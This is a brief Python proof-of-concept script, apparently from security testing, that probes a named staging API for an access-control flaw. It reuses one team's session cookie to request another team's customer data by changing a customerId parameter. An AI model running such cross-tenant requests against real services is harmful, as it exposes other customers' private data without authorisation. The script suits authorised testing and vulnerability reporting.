import requests
import json

# API endpoint for customer data retrieval
api_url = "https://staging.gearset.com/api/customerData"

# Create a session to simulate a logged-in user from Team A
session = requests.Session()

# Set a valid session cookie for a user from Team A (replace with a real cookie for testing)
session.cookies.set('sessionid', 'valid_session_cookie_for_TeamA')

# Step 1: Legitimate access for Team A
response_team_a = session.get(api_url, params={'customerId': 'TeamA'})
print("Team A Data Response:")
try:
    team_a_json = response_team_a.json()
    print(json.dumps(team_a_json, indent=4))
except Exception as e:
    print("Failed to parse JSON for Team A:", response_team_a.text)

# Step 2: Tampered request attempting to access Team B's data
response_team_b = session.get(api_url, params={'customerId': 'TeamB'})
print("\nTeam B Data Response:")
try:
    team_b_json = response_team_b.json()
    print(json.dumps(team_b_json, indent=4))
except Exception as e:
    print("Failed to parse JSON for Team B:", response_team_b.text)
